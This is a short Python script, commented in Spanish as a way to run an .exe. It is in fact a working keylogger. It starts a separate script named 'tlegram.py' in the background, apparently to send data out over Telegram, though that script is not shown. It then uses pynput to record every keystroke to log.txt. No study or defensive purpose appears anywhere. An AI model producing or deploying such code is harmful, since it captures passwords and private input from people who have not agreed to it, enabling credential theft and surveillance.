#ejecutar un .exe en python

from fileinput import close
import subprocess
from pynput.keyboard import Listener

subprocess.Popen('tlegram.py',shell=True)
def listener_teclado(key):
    letter=str(key)
    with open('log.txt','a') as f:
        f.write(letter)

if __name__ == '__main__':
    with Listener(on_press=listener_teclado) as listener:
        listener.join()
